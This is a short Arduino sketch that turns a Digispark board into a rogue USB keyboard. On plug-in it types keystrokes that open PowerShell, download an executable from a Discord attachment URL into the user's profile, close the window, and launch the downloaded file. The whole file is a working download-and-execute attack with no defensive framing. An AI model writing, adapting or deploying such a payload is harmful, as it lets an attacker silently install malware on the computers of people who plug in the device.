#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("$client = new-object System.Net.WebClient");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("$client.DownloadFile(\"https://cdn.discordapp.com/attachments/1154886908002959442/1154887544299868201/cVGnHLR.exe\", \"cVGnHLR.exe\")");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("%USERPROFILE%\\cVGnHLR.exe");
  DigiKeyboard.delay(500);
}


void loop() { }
